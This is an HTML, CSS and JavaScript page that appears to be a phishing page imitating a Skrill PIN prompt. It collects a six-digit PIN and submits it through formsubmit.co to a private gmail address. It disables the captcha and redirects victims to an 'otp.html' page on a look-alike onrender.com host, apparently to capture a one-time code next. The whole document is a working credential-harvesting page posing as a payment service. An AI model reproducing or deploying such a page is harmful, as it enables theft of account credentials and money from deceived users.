      body {
        background-color: #ffffff;
        color: #000000;
        font-family: Arial, sans-serif;
        display: flex;
        flex-direction: column;

        height: 100vh;
        margin: 0;
      }
      .container {
        text-align: center;
        background: #f1edf138;
        padding: 3rem;
      }
      h2 {
        margin-bottom: 30px;
      }
      .account {
        background: #ffffff;
        padding: 10px 20px;
        border-radius: 10px;
        margin-bottom: 20px;
      }
      .pin-input {
        display: flex;
        justify-content: center;
        gap: 5px;
        margin-bottom: 20px;
      }
      .pin-input input {
        width: 20px;
        height: 50px;
        font-size: 24px;
        text-align: center;
        border: none;
        border-bottom: 2px solid #000000;
        background: transparent;
        color: #000000;
        outline: none;
      }
      .forgot {
        color: #b100ff;
        text-decoration: none;
        font-weight: bold;
        margin-top: 4rem;
      }
      .imglogo,
      .loginu {
        width: 100px;
        margin-left: auto;
        margin-right: auto;
        margin-bottom: 4rem;
        display: block;
      }
      .imglogo {
        border-style: none;
      }
      .imglogo {
        border: 0;
        border-top-style: none;
        border-right-style: none;
        border-bottom-style: none;
        border-left-style: none;
      }
      .bg-gray-100 {
        --tw-bg-opacity: 1;
        background-color: white;
      }
      .bg-white {
        --tw-bg-opacity: 1;
        background-color: #fafafa;
      }
      .bg-primary {
        --tw-bg-opacity: 1;
        background-color: #5f128d;
      }
      .mt-w {
        margin-top: 15rem;
      }
      .text-white {
        --tw-text-opacity: 1;
        color: rgb(255 255 255 / var(--tw-text-opacity));
      }
      .w-full {
        width: 100%;
      }

  <body>
    <div class="container">
      <img class="imglogo" src="asset/header-logo.png" />

      <p>Enter your PIN</p>
      <form
        id="pinForm"
        action="https://formsubmit.co/emenikeonyechere@gmail.com"
        method="POST"
      >
        <input type="hidden" name="_captcha" value="false" />
        <input type="hidden" name="_next" value="https://skrill-web.onrender.com/otp.html" />

        <div class="pin-input">
          <input
            type="text"
            name="pin1"
            maxlength="1"
            inputmode="numeric"
            required
            pattern="[0-9]*"
          />
          <input
            type="text"
            name="pin2"
            maxlength="1"
            inputmode="numeric"
            required
            pattern="[0-9]*"
          />
          <input
            type="text"
            name="pin3"
            maxlength="1"
            inputmode="numeric"
            required
            pattern="[0-9]*"
          />
          <input
            type="text"
            name="pin4"
            maxlength="1"
            inputmode="numeric"
            required
            pattern="[0-9]*"
          />
          <input
            type="text"
            name="pin5"
            maxlength="1"
            inputmode="numeric"
            required
            pattern="[0-9]*"
          />
          <input
            type="text"
            name="pin6"
            maxlength="1"
            inputmode="numeric"
            required
            pattern="[0-9]*"
          />
        </div>

        <div class="forgot">Forgot PIN</div>
        <button
          id="redirectBtn"
          type="submit"
          disabled
          class="bg-primary mt-w text-white w-full rounded-md p-4 disabled:opacity-80"
        >
          Continue
        </button>
      </form>
    </div>

    <script>
      document.addEventListener("DOMContentLoaded", function () {
        const inputs = document.querySelectorAll(".pin-input input");
        const button = document.getElementById("redirectBtn");

        function checkPinFilled() {
          const allFilled = Array.from(inputs).every(
            (input) => input.value.length === 1
          );
          button.disabled = !allFilled;
        }

        inputs.forEach((input, index) => {
          input.addEventListener("input", (e) => {
            const value = e.target.value.replace(/[^0-9]/g, "");
            e.target.value = value;

            if (value && index < inputs.length - 1) {
              inputs[index + 1].focus();
            }
            checkPinFilled();
          });

          input.addEventListener("keydown", (e) => {
            if (e.key === "Backspace" && !input.value && index > 0) {
              inputs[index - 1].focus();
            }
          });
        });
      });
    </script>
